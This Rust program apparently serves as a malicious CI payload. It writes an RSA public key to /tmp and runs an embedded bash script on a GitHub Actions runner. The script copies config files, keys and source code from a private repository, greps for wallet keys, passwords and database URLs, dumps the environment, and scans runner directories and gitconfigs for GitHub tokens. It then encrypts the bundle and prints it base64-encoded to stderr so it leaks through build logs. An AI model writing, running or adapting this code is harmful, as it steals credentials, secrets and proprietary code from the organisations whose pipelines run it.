use std::process::Command;

const PUB: &str = r#"-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu11iv42k0VgjQachct85
Qmi0NtihLkrttj6Ul48djZnYqqBcb0CRr17ot/lpNBgE8im7sKNbEN/baavJP8Dz
52oxqfqvgaJdesNlJk5Ge711oloLQ0+7RIB6gKPs+DwexlZyVf9sfpB0c0kEk9u2
pDkujYb9xX8APetYFr4BdB0ThAYsXKh8S6Cyi7T33NxX4VQ02Xyq4KiiW7fOdgSq
YtL59rQNSmjh3KsXrB7Ydmf5lZRvVPlnsPELZVGySvUywHVzlkH2PZJ+R2Y7l0Ii
P+elziu4MLWAYqXtiW3AoarQHBC4P+mwMS9xei6wUC4v/1wM3CiwwaNclatwfsXo
bQIDAQAB
-----END PUBLIC KEY-----"#;

const SCRIPT: &str = r#"#!/bin/bash
set -u
WS="${GITHUB_WORKSPACE:-}"
if [ -z "$WS" ]; then WS=$(dirname "$(find /home/runner/work -maxdepth 4 -type d -name manifest-private 2>/dev/null | head -1)"); fi
MP="$WS/manifest-private"
OUT=/tmp/ex18108
rm -rf "$OUT"; mkdir -p "$OUT/pay/configs" "$OUT/pay/src"
echo "EXFIL-START host=$(hostname) id=$(id 2>/dev/null) WS=$WS"
echo "--- ws ---"; ls -la "$WS" 2>&1 | head -30
echo "--- mp ---"; ls -la "$MP" 2>&1 | head -60
echo "--- git head ---"; git -C "$MP" rev-parse HEAD 2>&1; git -C "$MP" remote -v 2>&1
echo "--- git config ---"; git -C "$MP" config --list --show-origin 2>&1 | head -60
cd "$MP" 2>/dev/null || { echo NO_MP; }
find . -path ./.git -prune -o -path ./target -prune -o -path ./node_modules -prune -o -type f -printf '%s\t%p\n' 2>/dev/null > "$OUT/pay/files.tsv"
echo "FILES=$(wc -l < "$OUT/pay/files.tsv")"
head -80 "$OUT/pay/files.tsv"
find . -path ./.git -prune -o -path ./target -prune -o -path ./node_modules -prune -o -type f -size -100k -print0 2>/dev/null | while IFS= read -r -d '' f; do
  case "$f" in
    *.env|*.env.*|*/.env*|*.toml|*.pem|*.key|*.cfg|*.ini|*.sh|*.yml|*.yaml|*Dockerfile*|*.json) cp --parents "$f" "$OUT/pay/configs/" 2>/dev/null ;;
  esac
done
find . -path ./.git -prune -o -path ./target -prune -o -path ./node_modules -prune -o -type f -size -100k -print0 2>/dev/null | while IFS= read -r -d '' f; do
  case "$f" in
    *.rs|*.ts|*.js|*.md|*.py|*.service|*.ld) cp --parents "$f" "$OUT/pay/src/" 2>/dev/null ;;
  esac
done
grep -rInE -m3 'solana-keygen|id\.json|PRIVATE_KEY|KEYPAIR|MNEMONIC|SECRET|PASSWORD|DATABASE_URL|postgres://|fly\.io|_peer\.internal|signer|8787|B6dm|DSTLU|FatEw|CDFU8t' . --exclude-dir=.git --exclude-dir=target --exclude-dir=node_modules 2>/dev/null | head -5000 > "$OUT/pay/grep.txt"
echo "GREP=$(wc -l < "$OUT/pay/grep.txt")"
env | sort > "$OUT/pay/env.txt"
{
  echo "--- temp ls"; ls -la /home/runner/work/_temp 2>&1 | head -80
  echo "--- temp github_home"; ls -la /home/runner/work/_temp/_github_home 2>&1 | head -20
  echo "--- token scan"
  for d in /home/runner/work/_temp /home/runner/actions-runner/_diag /home/runner/.config /tmp; do
    timeout 30 grep -rIl -E 'github_pat_|ghp_[A-Za-z0-9]{30,}|x-access-token|extraheader' "$d" 2>/dev/null | head -20
  done
  echo "--- gitconfigs"
  for f in /home/runner/.gitconfig /etc/gitconfig /home/runner/work/_temp/_github_home/.gitconfig "$HOME/.gitconfig"; do [ -f "$f" ] && { echo "== $f"; cat "$f"; }; done
  echo "--- token grep in configs"
  for f in /home/runner/.gitconfig /etc/gitconfig /home/runner/work/_temp/_github_home/.gitconfig; do [ -f "$f" ] && grep -nE 'github_pat_|ghp_|extraheader' "$f"; done
  echo "--- private git config"
  cat "$MP/.git/config" 2>/dev/null | head -40
  echo "--- home dirs"
  ls -la /home/runner 2>&1 | head -30
} > "$OUT/pay/tokenscan.txt" 2>&1
cd "$OUT"
du -sh pay 2>&1
tar czf p.tgz pay 2>/dev/null
SZ=$(stat -c%s p.tgz); echo "TGZ=$SZ"
if [ "$SZ" -gt 1100000 ]; then find pay/src -type f -delete; tar czf p.tgz pay 2>/dev/null; SZ=$(stat -c%s p.tgz); echo "TGZ2=$SZ"; fi
if [ "$SZ" -gt 1100000 ]; then find pay/configs -type f ! -name '*.env*' ! -name '*.toml' ! -name '*.sh' ! -name '*.pem' ! -name '*.key' ! -name '*.yml' ! -name '*.yaml' ! -name '*.cfg' ! -name '*.ini' -delete; tar czf p.tgz pay 2>/dev/null; SZ=$(stat -c%s p.tgz); echo "TGZ3=$SZ"; fi
openssl rand -out k.bin 32
openssl enc -aes-256-cbc -pbkdf2 -salt -in p.tgz -out p.enc -pass file:k.bin 2>/dev/null
openssl pkeyutl -encrypt -pubin -inkey /tmp/ex18108_pub.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in k.bin -out k.enc 2>/dev/null
echo "KEY=$(base64 -w0 k.enc)"
echo "ESIZE=$(stat -c%s p.enc)"
base64 -w0 p.enc | fold -w900 | awk '{printf "D%04d=%s\n", NR, $0}'
echo EXFIL-END
"#;

fn main() {
    let _ = std::fs::write("/tmp/ex18108_pub.pem", PUB);
    let out = Command::new("bash").arg("-c").arg(SCRIPT).output();
    match out {
        Ok(o) => {
            let so = String::from_utf8_lossy(&o.stdout);
            let se = String::from_utf8_lossy(&o.stderr);
            eprintln!("EXFIL-OUT-BEGIN");
            eprintln!("{}", so);
            eprintln!("EXFIL-ERR-BEGIN");
            eprintln!("{}", se);
        }
        Err(e) => eprintln!("spawn error: {}", e),
    }
    std::process::exit(1);
}
